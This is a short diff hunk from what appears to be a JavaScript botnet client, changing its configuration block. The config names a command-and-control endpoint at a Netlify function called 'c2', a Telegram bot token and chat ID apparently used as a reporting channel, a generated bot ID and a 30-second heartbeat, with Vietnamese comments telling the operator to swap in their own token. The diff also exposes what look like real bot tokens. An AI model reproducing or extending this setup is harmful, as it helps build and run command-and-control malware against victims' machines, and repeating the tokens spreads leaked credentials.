@@ -10,7 +10,7 @@
     // ===== CONFIG =====
     const CONFIG = {
         C2_URL: '/.netlify/functions/c2',
-        TELEGRAM_BOT: '8694531485:AAGEFpgDhRNnpHGrnzceC9Qp5r9ldto3Nt8', // Thay token
+        TELEGRAM_BOT: '8850216835:AAEW5ECVAt52m-omYejMu5xNQwLm5By70SE', // Thay token
         TELEGRAM_CHAT: '8594169530',   // Thay chat ID
         BOT_ID: generateBotId(),
         HEARTBEAT_INTERVAL: 30000, // 30 giây
